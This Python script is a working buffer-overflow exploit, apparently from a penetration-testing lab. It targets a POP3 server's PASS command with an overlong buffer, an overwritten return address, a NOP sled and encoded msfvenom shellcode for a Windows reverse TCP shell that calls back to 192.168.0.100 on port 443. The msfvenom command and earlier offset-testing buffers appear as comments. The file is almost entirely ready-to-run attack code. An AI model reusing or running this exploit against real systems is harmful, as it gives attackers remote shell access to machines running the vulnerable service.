#!/usr/bin/python
#
#
#Test One to confirm the Crash of the Application
#
#Imports
import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread

shellcode = (
    "\xbb\xb4\x25\xbb\xae\xda\xd1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1" +
    "\x52\x83\xc6\x04\x31\x5e\x0e\x03\xea\x2b\x59\x5b\xee\xdc\x1f" +
    "\xa4\x0e\x1d\x40\x2c\xeb\x2c\x40\x4a\x78\x1e\x70\x18\x2c\x93" +
    "\xfb\x4c\xc4\x20\x89\x58\xeb\x81\x24\xbf\xc2\x12\x14\x83\x45" +
    "\x91\x67\xd0\xa5\xa8\xa7\x25\xa4\xed\xda\xc4\xf4\xa6\x91\x7b" +
    "\xe8\xc3\xec\x47\x83\x98\xe1\xcf\x70\x68\x03\xe1\x27\xe2\x5a" +
    "\x21\xc6\x27\xd7\x68\xd0\x24\xd2\x23\x6b\x9e\xa8\xb5\xbd\xee" +
    "\x51\x19\x80\xde\xa3\x63\xc5\xd9\x5b\x16\x3f\x1a\xe1\x21\x84" +
    "\x60\x3d\xa7\x1e\xc2\xb6\x1f\xfa\xf2\x1b\xf9\x89\xf9\xd0\x8d" +
    "\xd5\x1d\xe6\x42\x6e\x19\x63\x65\xa0\xab\x37\x42\x64\xf7\xec" +
    "\xeb\x3d\x5d\x42\x13\x5d\x3e\x3b\xb1\x16\xd3\x28\xc8\x75\xbc" +
    "\x9d\xe1\x85\x3c\x8a\x72\xf6\x0e\x15\x29\x90\x22\xde\xf7\x67" +
    "\x44\xf5\x40\xf7\xbb\xf6\xb0\xde\x7f\xa2\xe0\x48\xa9\xcb\x6a" +
    "\x88\x56\x1e\x3c\xd8\xf8\xf1\xfd\x88\xb8\xa1\x95\xc2\x36\x9d" +
    "\x86\xed\x9c\xb6\x2d\x14\x77\x79\x19\x16\xe3\x11\x58\x16\xea" +
    "\x5a\xd5\xf0\x86\x8c\xb0\xab\x3e\x34\x99\x27\xde\xb9\x37\x42" +
    "\xe0\x32\xb4\xb3\xaf\xb2\xb1\xa7\x58\x33\x8c\x95\xcf\x4c\x3a" +
    "\xb1\x8c\xdf\xa1\x41\xda\xc3\x7d\x16\x8b\x32\x74\xf2\x21\x6c" +
    "\x2e\xe0\xbb\xe8\x09\xa0\x67\xc9\x94\x29\xe5\x75\xb3\x39\x33" +
    "\x75\xff\x6d\xeb\x20\xa9\xdb\x4d\x9b\x1b\xb5\x07\x70\xf2\x51" +
    "\xd1\xba\xc5\x27\xde\x96\xb3\xc7\x6f\x4f\x82\xf8\x40\x07\x02" +
    "\x81\xbc\xb7\xed\x58\x05\xd7\x0f\x48\x70\x70\x96\x19\x39\x1d" +
    "\x29\xf4\x7e\x18\xaa\xfc\xfe\xdf\xb2\x75\xfa\xa4\x74\x66\x76" +
    "\xb4\x10\x88\x25\xb5\x30")
    
buffer = "A" * 2605 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + shellcode    
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + (3500 - 4 - 2602) * "\x43"


try:
    print "\n Sending evil buffer"
    s.connect(('192.168.0.50',110))
    data = s.recv(1024)
    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    s.send('PASS  ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"


